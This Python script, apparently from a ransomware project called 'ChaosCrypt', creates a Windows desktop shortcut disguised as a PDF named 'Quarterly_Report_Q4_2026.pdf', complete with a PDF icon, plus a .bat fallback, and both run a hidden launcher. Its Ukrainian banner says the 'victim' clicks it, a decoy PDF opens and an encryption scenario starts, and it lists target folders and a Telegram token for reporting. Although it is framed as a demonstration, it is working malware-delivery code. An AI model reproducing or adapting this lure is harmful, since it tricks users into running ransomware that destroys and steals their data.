import os
import sys

LAUNCHER_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(LAUNCHER_DIR)
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from chaoscrypt.settings import ASSETS_DIR, IMG_ICO_NAME

DESKTOP = os.path.join(os.path.expanduser("~"), "Desktop")
SHORTCUT_NAME = "Quarterly_Report_Q4_2026.pdf"
LAUNCHER_PATH = os.path.join(LAUNCHER_DIR, "launcher.py")
PYTHON = sys.executable


def get_pdf_icon():
    pdf_ico = os.path.join(ASSETS_DIR, "pdf.ico")
    if os.path.isfile(pdf_ico) and os.path.getsize(pdf_ico) > 0:
        return pdf_ico
    chaos_ico = os.path.join(ASSETS_DIR, IMG_ICO_NAME)
    if os.path.isfile(chaos_ico) and os.path.getsize(chaos_ico) > 0:
        return chaos_ico
    return None


def create_shortcut():
    shortcut_path = os.path.join(DESKTOP, SHORTCUT_NAME + ".lnk")
    icon_path = get_pdf_icon()

    vbs_lines = [
        'Set WshShell = WScript.CreateObject("WScript.Shell")',
        f'Set oLink = WshShell.CreateShortcut("{shortcut_path}")',
        f'oLink.TargetPath = "{PYTHON}"',
        f'oLink.Arguments = """{LAUNCHER_PATH}"""',
        f'oLink.WorkingDirectory = "{ROOT_DIR}"',
        'oLink.Description = "Quarterly Financial Report Q4 2026"',
        'oLink.WindowStyle = 1',
    ]
    if icon_path:
        vbs_lines.append(f'oLink.IconLocation = "{icon_path}"')
    vbs_lines.append('oLink.Save')

    vbs_content = "\n".join(vbs_lines) + "\n"
    vbs_path = os.path.join(ROOT_DIR, "_create_shortcut.vbs")

    try:
        with open(vbs_path, 'w', encoding='utf-8') as f:
            f.write(vbs_content)
        os.system(f'cscript //nologo "{vbs_path}"')
        try:
            os.remove(vbs_path)
        except Exception:
            pass

        if os.path.isfile(shortcut_path):
            return shortcut_path
        return None
    except Exception as e:
        print(f"  [!] VBS error: {e}")
        return None


def create_bat_fallback():
    """Fallback .bat (без іконки PDF)."""
    bat_path = os.path.join(DESKTOP, "Quarterly_Report_Q4_2026.bat")
    bat_content = (
        '@echo off\n'
        'title Quarterly Report Q4 2026 - Loading...\n'
        f'cd /d "{ROOT_DIR}"\n'
        f'"{PYTHON}" "{LAUNCHER_PATH}"\n'
        'pause\n'
    )
    with open(bat_path, 'w', encoding='utf-8') as f:
        f.write(bat_content)
    return bat_path


def deploy():
    print()
    print("  ╔══════════════════════════════════════════════╗")
    print("  ║      ChaosCrypt Desktop Deployer             ║")
    print("  ╚══════════════════════════════════════════════╝")
    print()

    if sys.platform != "win32":
        print("  [!] Windows only. On Linux create .desktop manually.")
        return

    if not os.path.isdir(DESKTOP):
        print(f"  [!] Desktop not found: {DESKTOP}")
        return

    if not os.path.isfile(LAUNCHER_PATH):
        print(f"  [!] launcher.py not found: {LAUNCHER_PATH}")
        return

    icon = get_pdf_icon()
    print(f"  Desktop:  {DESKTOP}")
    print(f"  Launcher: {LAUNCHER_PATH}")
    print(f"  Python:   {PYTHON}")
    print(f"  Icon:     {icon or 'NONE (pdf.ico is empty!)'}")
    print()

    # Метод 1: .lnk ярлик з іконкою PDF
    print("  [*] Creating .lnk shortcut...")
    result = create_shortcut()

    if result:
        print(f"  [+] Created: {result}")
    else:
        print("  [!] .lnk failed, creating .bat fallback...")
        bat = create_bat_fallback()
        print(f"  [+] BAT created: {bat}")
        print("  [!] BAT has no PDF icon — use .lnk for best effect.")

    print(f"""
  ╔══════════════════════════════════════════════════════════╗
  ║  DONE!                                                   ║
  ╠══════════════════════════════════════════════════════════╣
  ║                                                          ║
  ║  На Desktop з'явився файл:                               ║
  ║  📄 "Quarterly_Report_Q4_2026.pdf"                       ║
  ║                                                          ║
  ║  Жертва клікає → відкривається decoy_report.pdf          ║
  ║                + запускається весь сценарій 8 хв          ║
  ║                                                          ║
  ╠══════════════════════════════════════════════════════════╣
  ║  ПЕРЕД ДЕМОНСТРАЦІЄЮ перевір:                            ║
  ║  1. Target_Show/   — є файли для шифрування              ║
  ║  2. Target_Stealth/ — є файли для шифрування             ║
  ║  3. .env файл      — TG токен і chat_id                  ║
  ║  4. pdf.ico         — не порожній (для іконки PDF)        ║
  ╚══════════════════════════════════════════════════════════╝
""")


if __name__ == "__main__":
    deploy()